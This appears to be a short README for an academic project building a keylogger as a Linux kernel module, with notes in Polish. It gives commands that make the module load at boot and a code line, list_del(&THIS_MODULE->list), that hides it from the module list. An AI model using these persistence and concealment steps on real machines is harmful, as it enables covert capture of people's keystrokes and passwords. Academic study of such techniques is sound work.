# lkmKeylogger
Academic project - keylogger as a linux kernel module

-----
Włączanie modułu przy starcie systemu (załadowanie modułu)
-----

https://stackoverflow.com/questions/4356224/how-to-load-a-custom-module-at-the-boot-time-in-ubuntu
http://www.ouah.org/LKM_HACKING.html#I.6.

do pliku Makefile dodałem:

#skopiowanie modułu do folderu ze sterownikami

sudo cp mymodule.ko /lib/modules/$(shell uname -r)/kernel/drivers/

#dodanie modułu do pliku automatycznie uruchamiajacego module-at-the-boot-time-in-ubuntu

echo 'mymodule' | sudo tee -a /etc/modules

#włączenie modułu

sudo insmod keylogger.ko

#Update the list of module dependencies.

sudo depmod

do pliku keylogger.c dodałem:

#Ukrywanie modulu na liscie
list_del(&THIS_MODULE->list);


-----
Stworznie bufora zwalnianego klawiszem <ENTER>
-----

working!
